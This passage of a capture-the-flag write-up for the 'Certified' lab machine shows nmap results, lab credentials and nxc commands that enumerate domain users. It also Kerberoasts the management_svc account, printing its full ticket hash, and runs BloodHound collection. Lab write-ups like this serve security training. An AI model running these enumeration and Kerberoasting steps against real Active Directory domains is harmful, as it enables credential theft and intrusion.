+593/tcp   open  ncacn_http    Microsoft Windows RPC over HTTP 1.0
+636/tcp   open  ssl/ldap      Microsoft Windows Active Directory LDAP (Domain: certified.htb, Site: Default-First-Site-Name)
+| ssl-cert: Subject: 
+| Subject Alternative Name: DNS:DC01.certified.htb, DNS:certified.htb, DNS:CERTIFIED
+| Not valid before: 2025-06-11T21:05:29
+|_Not valid after:  2105-05-23T21:05:29
+|_ssl-date: 2026-02-26T01:17:50+00:00; +7h00m03s from scanner time.
+3268/tcp  open  ldap          Microsoft Windows Active Directory LDAP (Domain: certified.htb, Site: Default-First-Site-Name)
+|_ssl-date: 2026-02-26T01:17:50+00:00; +7h00m03s from scanner time.
+| ssl-cert: Subject: 
+| Subject Alternative Name: DNS:DC01.certified.htb, DNS:certified.htb, DNS:CERTIFIED
+| Not valid before: 2025-06-11T21:05:29
+|_Not valid after:  2105-05-23T21:05:29
+3269/tcp  open  ssl/ldap      Microsoft Windows Active Directory LDAP (Domain: certified.htb, Site: Default-First-Site-Name)
+| ssl-cert: Subject: 
+| Subject Alternative Name: DNS:DC01.certified.htb, DNS:certified.htb, DNS:CERTIFIED
+| Not valid before: 2025-06-11T21:05:29
+|_Not valid after:  2105-05-23T21:05:29
+|_ssl-date: 2026-02-26T01:17:50+00:00; +7h00m03s from scanner time.
+5985/tcp  open  http          Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP)
+|_http-title: Not Found
+|_http-server-header: Microsoft-HTTPAPI/2.0
+9389/tcp  open  mc-nmf        .NET Message Framing
+49667/tcp open  msrpc         Microsoft Windows RPC
+49693/tcp open  ncacn_http    Microsoft Windows RPC over HTTP 1.0
+49694/tcp open  msrpc         Microsoft Windows RPC
+49697/tcp open  msrpc         Microsoft Windows RPC
+49724/tcp open  msrpc         Microsoft Windows RPC
+49745/tcp open  msrpc         Microsoft Windows RPC
+49780/tcp open  msrpc         Microsoft Windows RPC
+Warning: OSScan results may be unreliable because we could not find at least 1 open and 1 closed port
+Device type: general purpose
+Running (JUST GUESSING): Microsoft Windows 2019|10 (96%)
+OS CPE: cpe:/o:microsoft:windows_server_2019 cpe:/o:microsoft:windows_10
+Aggressive OS guesses: Windows Server 2019 (96%), Microsoft Windows 10 1903 - 21H1 (89%)
+No exact OS matches for host (test conditions non-ideal).
+Network Distance: 2 hops
+Service Info: Host: DC01; OS: Windows; CPE: cpe:/o:microsoft:windows
+
+Host script results:
+| smb2-time: 
+|   date: 2026-02-26T01:17:08
+|_  start_date: N/A
+|_clock-skew: mean: 7h00m02s, deviation: 0s, median: 7h00m02s
+| smb2-security-mode: 
+|   3.1.1: 
+|_    Message signing enabled and required
+
+TRACEROUTE (using port 135/tcp)
+HOP RTT      ADDRESS
+1   12.85 ms 10.10.14.1
+2   13.13 ms certified.htb (10.129.231.186)
+
+OS and Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
+Nmap done: 1 IP address (1 host up) scanned in 257.06 seconds</code></pre></div>
+<p>As is common in Windows pentests, you will start the Certified box with credentials for the following account: Username: judith.mader Password: judith09</p>
+<p>There are interesting users:</p>
+<div class="joplin-editable"><pre class="joplin-source" data-joplin-language="" data-joplin-source-open="```
+" data-joplin-source-close="
+```">&boxdr;&boxh;&boxh;(kali㉿kali)-[~/Desktop/Labs/Certified]
+&boxur;&boxh;$ nxc ldap certified.htb -u judith.mader -p judith09 --users    
+LDAP        10.129.231.186  389    DC01             [*] Windows 10 / Server 2019 Build 17763 (name:DC01) (domain:certified.htb) (signing:None) (channel binding:Never) 
+LDAP        10.129.231.186  389    DC01             [+] certified.htb\judith.mader:judith09 
+LDAP        10.129.231.186  389    DC01             [*] Enumerated 9 domain users: certified.htb
+LDAP        10.129.231.186  389    DC01             -Username-                    -Last PW Set-       -BadPW-  -Description-                                               
+LDAP        10.129.231.186  389    DC01             Administrator                 2024-05-13 10:53:16 0        Built-in account for administering the computer/domain      
+LDAP        10.129.231.186  389    DC01             Guest                         &lt;never&gt;             1        Built-in account for guest access to the computer/domain    
+LDAP        10.129.231.186  389    DC01             krbtgt                        2024-05-13 11:02:51 0        Key Distribution Center Service Account                     
+LDAP        10.129.231.186  389    DC01             judith.mader                  2024-05-14 15:22:11 0                                                                    
+LDAP        10.129.231.186  389    DC01             management_svc                2024-05-13 11:30:51 0                                                                    
+LDAP        10.129.231.186  389    DC01             ca_operator                   2024-05-13 11:32:03 0                                                                    
+LDAP        10.129.231.186  389    DC01             alexander.huges               2024-05-14 12:39:08 0                                                                    
+LDAP        10.129.231.186  389    DC01             harry.wilson                  2024-05-14 12:39:37 0                                                                    
+LDAP        10.129.231.186  389    DC01             gregory.cameron               2024-05-14 12:40:05 0</pre><pre class="hljs"><code>&boxdr;&boxh;&boxh;(kali㉿kali)-[~/Desktop/Labs/Certified]
+&boxur;&boxh;$ nxc ldap certified.htb -u judith.mader -p judith09 --users    
+LDAP        10.129.231.186  389    DC01             [*] Windows 10 / Server 2019 Build 17763 (name:DC01) (domain:certified.htb) (signing:None) (channel binding:Never) 
+LDAP        10.129.231.186  389    DC01             [+] certified.htb\judith.mader:judith09 
+LDAP        10.129.231.186  389    DC01             [*] Enumerated 9 domain users: certified.htb
+LDAP        10.129.231.186  389    DC01             -Username-                    -Last PW Set-       -BadPW-  -Description-                                               
+LDAP        10.129.231.186  389    DC01             Administrator                 2024-05-13 10:53:16 0        Built-in account for administering the computer/domain      
+LDAP        10.129.231.186  389    DC01             Guest                         &lt;never&gt;             1        Built-in account for guest access to the computer/domain    
+LDAP        10.129.231.186  389    DC01             krbtgt                        2024-05-13 11:02:51 0        Key Distribution Center Service Account                     
+LDAP        10.129.231.186  389    DC01             judith.mader                  2024-05-14 15:22:11 0                                                                    
+LDAP        10.129.231.186  389    DC01             management_svc                2024-05-13 11:30:51 0                                                                    
+LDAP        10.129.231.186  389    DC01             ca_operator                   2024-05-13 11:32:03 0                                                                    
+LDAP        10.129.231.186  389    DC01             alexander.huges               2024-05-14 12:39:08 0                                                                    
+LDAP        10.129.231.186  389    DC01             harry.wilson                  2024-05-14 12:39:37 0                                                                    
+LDAP        10.129.231.186  389    DC01             gregory.cameron               2024-05-14 12:40:05 0</code></pre></div>
+<p>We can Kerberoast the <code class="inline-code">management_svc</code> user:</p>
+<div class="joplin-editable"><pre class="joplin-source" data-joplin-language="" data-joplin-source-open="```
+" data-joplin-source-close="
+```">&boxdr;&boxh;&boxh;(kali㉿kali)-[~/Desktop/Labs/Certified]
+&boxur;&boxh;$ nxc ldap certified.htb -u judith.mader -p judith09 --kerberoast out
+LDAP        10.129.231.186  389    DC01             [*] Windows 10 / Server 2019 Build 17763 (name:DC01) (domain:certified.htb) (signing:None) (channel binding:Never) 
+LDAP        10.129.231.186  389    DC01             [+] certified.htb\judith.mader:judith09 
+LDAP        10.129.231.186  389    DC01             [*] Skipping disabled account: krbtgt
+LDAP        10.129.231.186  389    DC01             [*] Total of records returned 1
+LDAP        10.129.231.186  389    DC01             [*] sAMAccountName: management_svc, memberOf: [&apos;CN=Management,CN=Users,DC=certified,DC=htb&apos;, &apos;CN=Remote Management Users,CN=Builtin,DC=certified,DC=htb&apos;], pwdLastSet: 2024-05-13 11:30:51.476756, lastLogon: &lt;never&gt;
+LDAP        10.129.231.186  389    DC01             $krb5tgs$23$*management_svc$CERTIFIED.HTB$certified.htb\management_svc*$55bd1780a36c3abf26fb7c4bc98ef7f1$824ab37b2430659fb674268a5975fbd6514a2cd65a3cf9cb95d99f330a4008fa24c8c152d28c107409a621a0077aedd342ad49776115984e2253b72bcfeb07b8cf49665a1481b80684728855bfccbd52f84c39463ae33836e1edaa6f6e36df28fd75436c6840b1ed78f9732cf291a82a2586ee8678e81bc658625692a4585f45777a8fe5402ab6bba6259f4c840837eaca7792d6077b0127f423c886efac2285deb30eb418a0cddc7323166f77340d1a38f095123bd8c6bd6cc6b8bf9f23c09ee6a69f547cfb065ad564d2ebf82de1df363d8d4f726b432ddfcdf349fb49598036d2bbe25607d70ad9ad41fb4098aad539a5919b74e8a5769c95506469fb9ea9234edd1dcb414eb59b62aa21a196f771a95c1a93811256695929a811b9f272f53b95d9d53e24f9ec5f9b520f0822d3e98dcd0fcd446369e0253663221a3bf3eb38bcbc11c3225b051a2c3deaa7622353e6c2baa098075bbe13764ef3d359e72840c78dce558dad0637e0896c2196fdfb7b4c833a7a7b7996c09e249253d05d3491623491a25130f073b3f275a839f3a67d91e8e81b2a934ba8aef5505176d58c7ab7131ddbd3bb7047f1faa0b81734e990b85f7c32725a468a4046760dd78d0d24eb1d0aa9a9c08a5617c8886fcc52008ed4ec6d86f4318714b92b73064d208661ee17fde9e0908811a9631cbb718ed48f69086f88745970bbe9e0b82b12a5e1e540a741762fdfd630ae686631b31961f826f3a2dc02007f52931e7682705dfcc76225f310cc5e5c3705a5b2881a116d454c283ec52905f9d2fca89ef8e6338b4d541b30325b22412840f721b91f2c54fd7d4efca5cc0698e8cfe35b8d088f6933b7c4eff87411315e38ce9adcf9f6548a9f0ea65ad4a7dd65ba323c8646d01963405a923cdc171fa343505bd8343cb0b2ca44f0e013c078a1d8e2ba0210cc48e8fe847f6bd40b8af9259ba7f08a2b2cb24ebf1cf6cfa4136d8a2a596c9fb7b572bcb9e42cdb082229cb7e748f16746b91db673a0974be225a48fd3ed39d81d7f434204800f76d281489838010dc6a93d8b437128c3ef1f7931a0be09dc707fa3559d1c229e679ab64c3cae59106f4e83ef798e378c562f6209c9a290a73240c43027f4d0c2095a0c4402e881cdd6648b5af8edbf719f52b3c233aff1373b1f7851164f0dd8cfcae9af0e3c5191ee254505626e25a84e4f16fe625ed1d1688e4934c3e3b5e7b0dd7abdaa570a37374f1ff3df8cae6bda856307fc31227abb7d733bf4d7f727f1a975b472416e6d1e38dc73339edf1ed5174ac1709b799a80f9777c5c3832c564b2a8e4ef52946f816bacbfb4136f4dca65bfbc12417421a7c894b27b56be5390766f3dfb86005e954d23bd1f39cc70d9d74cdf0d32db3b949b21f331ac9f334dc441331da9fb136c35bcde56e6bab2d4d0af218c97a3f0f80e7bf895977ba99a6f277f851f0081f0e28c9c25ba516f7607fc7af4f2d54a30989f0fd75ac740d30776f4d2e06fc7bab5d8a1d72fbb13102d8a6757ac0cf28de179b564c390caf5512ae6f65702eee0f47bd07a11a90faf0ce86fe</pre><pre class="hljs"><code>&boxdr;&boxh;&boxh;(kali㉿kali)-[~/Desktop/Labs/Certified]
+&boxur;&boxh;$ nxc ldap certified.htb -u judith.mader -p judith09 --kerberoast out
+LDAP        10.129.231.186  389    DC01             [*] Windows 10 / Server 2019 Build 17763 (name:DC01) (domain:certified.htb) (signing:None) (channel binding:Never) 
+LDAP        10.129.231.186  389    DC01             [+] certified.htb\judith.mader:judith09 
+LDAP        10.129.231.186  389    DC01             [*] Skipping disabled account: krbtgt
+LDAP        10.129.231.186  389    DC01             [*] Total of records returned 1
+LDAP        10.129.231.186  389    DC01             [*] sAMAccountName: management_svc, memberOf: [&apos;CN=Management,CN=Users,DC=certified,DC=htb&apos;, &apos;CN=Remote Management Users,CN=Builtin,DC=certified,DC=htb&apos;], pwdLastSet: 2024-05-13 11:30:51.476756, lastLogon: &lt;never&gt;
+LDAP        10.129.231.186  389    DC01             $krb5tgs$23$*management_svc$CERTIFIED.HTB$certified.htb\management_svc*$55bd1780a36c3abf26fb7c4bc98ef7f1$824ab37b2430659fb674268a5975fbd6514a2cd65a3cf9cb95d99f330a4008fa24c8c152d28c107409a621a0077aedd342ad49776115984e2253b72bcfeb07b8cf49665a1481b80684728855bfccbd52f84c39463ae33836e1edaa6f6e36df28fd75436c6840b1ed78f9732cf291a82a2586ee8678e81bc658625692a4585f45777a8fe5402ab6bba6259f4c840837eaca7792d6077b0127f423c886efac2285deb30eb418a0cddc7323166f77340d1a38f095123bd8c6bd6cc6b8bf9f23c09ee6a69f547cfb065ad564d2ebf82de1df363d8d4f726b432ddfcdf349fb49598036d2bbe25607d70ad9ad41fb4098aad539a5919b74e8a5769c95506469fb9ea9234edd1dcb414eb59b62aa21a196f771a95c1a93811256695929a811b9f272f53b95d9d53e24f9ec5f9b520f0822d3e98dcd0fcd446369e0253663221a3bf3eb38bcbc11c3225b051a2c3deaa7622353e6c2baa098075bbe13764ef3d359e72840c78dce558dad0637e0896c2196fdfb7b4c833a7a7b7996c09e249253d05d3491623491a25130f073b3f275a839f3a67d91e8e81b2a934ba8aef5505176d58c7ab7131ddbd3bb7047f1faa0b81734e990b85f7c32725a468a4046760dd78d0d24eb1d0aa9a9c08a5617c8886fcc52008ed4ec6d86f4318714b92b73064d208661ee17fde9e0908811a9631cbb718ed48f69086f88745970bbe9e0b82b12a5e1e540a741762fdfd630ae686631b31961f826f3a2dc02007f52931e7682705dfcc76225f310cc5e5c3705a5b2881a116d454c283ec52905f9d2fca89ef8e6338b4d541b30325b22412840f721b91f2c54fd7d4efca5cc0698e8cfe35b8d088f6933b7c4eff87411315e38ce9adcf9f6548a9f0ea65ad4a7dd65ba323c8646d01963405a923cdc171fa343505bd8343cb0b2ca44f0e013c078a1d8e2ba0210cc48e8fe847f6bd40b8af9259ba7f08a2b2cb24ebf1cf6cfa4136d8a2a596c9fb7b572bcb9e42cdb082229cb7e748f16746b91db673a0974be225a48fd3ed39d81d7f434204800f76d281489838010dc6a93d8b437128c3ef1f7931a0be09dc707fa3559d1c229e679ab64c3cae59106f4e83ef798e378c562f6209c9a290a73240c43027f4d0c2095a0c4402e881cdd6648b5af8edbf719f52b3c233aff1373b1f7851164f0dd8cfcae9af0e3c5191ee254505626e25a84e4f16fe625ed1d1688e4934c3e3b5e7b0dd7abdaa570a37374f1ff3df8cae6bda856307fc31227abb7d733bf4d7f727f1a975b472416e6d1e38dc73339edf1ed5174ac1709b799a80f9777c5c3832c564b2a8e4ef52946f816bacbfb4136f4dca65bfbc12417421a7c894b27b56be5390766f3dfb86005e954d23bd1f39cc70d9d74cdf0d32db3b949b21f331ac9f334dc441331da9fb136c35bcde56e6bab2d4d0af218c97a3f0f80e7bf895977ba99a6f277f851f0081f0e28c9c25ba516f7607fc7af4f2d54a30989f0fd75ac740d30776f4d2e06fc7bab5d8a1d72fbb13102d8a6757ac0cf28de179b564c390caf5512ae6f65702eee0f47bd07a11a90faf0ce86fe</code></pre></div>
+<p>Collect domain data:</p>
+<div class="joplin-editable"><pre class="joplin-source" data-joplin-language="" data-joplin-source-open="```
+" data-joplin-source-close="
+```">&boxdr;&boxh;&boxh;(kali㉿kali)-[~/Desktop/Labs/Certified]
+&boxur;&boxh;$ bloodhound-python -d certified.htb -u judith.mader -p judith09 -c all -ns 10.129.231.186 --zip
+INFO: BloodHound.py for BloodHound LEGACY (BloodHound 4.2 and 4.3)
+INFO: Found AD domain: certified.htb
+INFO: Getting TGT for user
+WARNING: Failed to get Kerberos TGT. Falling back to NTLM authentication. Error: [Errno Connection error (dc01.certified.htb:88)] [Errno -2] Name or service not known
+INFO: Connecting to LDAP server: dc01.certified.htb
+INFO: Found 1 domains
+INFO: Found 1 domains in the forest
+INFO: Found 1 computers
+INFO: Connecting to LDAP server: dc01.certified.htb
+INFO: Found 10 users
+INFO: Found 53 groups
+INFO: Found 2 gpos
+INFO: Found 1 ous
+INFO: Found 19 containers
+INFO: Found 0 trusts
+INFO: Starting computer enumeration with 10 workers
+INFO: Querying computer: DC01.certified.htb
+INFO: Done in 00M 06S
+INFO: Compressing output into 20260225133528_bloodhound.zip</pre><pre class="hljs"><code>&boxdr;&boxh;&boxh;(kali㉿kali)-[~/Desktop/Labs/Certified]
+&boxur;&boxh;$ bloodhound-python -d certified.htb -u judith.mader -p judith09 -c all -ns <span class="hljs-number">10.129</span>.<span class="hljs-number">231.186</span> --zip
+<span class="hljs-symbol">INFO:</span> BloodHound.py <span class="hljs-keyword">for</span> BloodHound LEGACY (BloodHound <span class="hljs-number">4.2</span> <span class="hljs-built_in">and</span> <span class="hljs-number">4.3</span>)
+<span class="hljs-symbol">INFO:</span> Found AD domain: certified.htb
+<span class="hljs-symbol">INFO:</span> Getting TGT <span class="hljs-keyword">for</span> user
+<span class="hljs-symbol">WARNING:</span> Failed <span class="hljs-keyword">to</span> <span class="hljs-keyword">get</span> Kerberos TGT. Falling back <span class="hljs-keyword">to</span> NTLM authentication. <span class="hljs-keyword">Error</span>: [Errno Connection <span class="hljs-keyword">error</span> (dc01.certified.htb:<span class="hljs-number">88</span>)] [Errno -<span class="hljs-number">2</span>] Name <span class="hljs-built_in">or</span> service <span class="hljs-built_in">not</span> known
+<span class="hljs-symbol">INFO:</span> Connecting <span class="hljs-keyword">to</span> LDAP server: dc01.certified.htb
+<span class="hljs-symbol">INFO:</span> Found <span class="hljs-number">1</span> domains
+<span class="hljs-symbol">INFO:</span> Found <span class="hljs-number">1</span> domains <span class="hljs-keyword">in</span> the forest
+<span class="hljs-symbol">INFO:</span> Found <span class="hljs-number">1</span> computers
+<span class="hljs-symbol">INFO:</span> Connecting <span class="hljs-keyword">to</span> LDAP server: dc01.certified.htb
+<span class="hljs-symbol">INFO:</span> Found <span class="hljs-number">10</span> users
+<span class="hljs-symbol">INFO:</span> Found <span class="hljs-number">53</span> groups
+<span class="hljs-symbol">INFO:</span> Found <span class="hljs-number">2</span> gpos
+<span class="hljs-symbol">INFO:</span> Found <span class="hljs-number">1</span> ous
+<span class="hljs-symbol">INFO:</span> Found <span class="hljs-number">19</span> containers
+<span class="hljs-symbol">INFO:</span> Found <span class="hljs-number">0</span> trusts
+<span class="hljs-symbol">INFO:</span> Starting computer enumeration <span class="hljs-keyword">with</span> <span class="hljs-number">10</span> workers
+<span class="hljs-symbol">INFO:</span> Querying computer: DC01.certified.htb
+<span class="hljs-symbol">INFO:</span> Done <span class="hljs-keyword">in</span> <span class="hljs-number">00</span>M <span class="hljs-number">06S</span>
+<span class="hljs-symbol">INFO:</span> Compressing output <span class="hljs-keyword">into</span> <span class="hljs-number">20260225133528_</span>bloodhound.zip</code></pre></div>
+<p>The <code class="inline-code">judith.mader</code> has <code class="inline-code">WriteOwner</code> privileges over the <code class="inline-code">MANAGEMENT</code> group:<br/>
+<img src="data:image/png;base64,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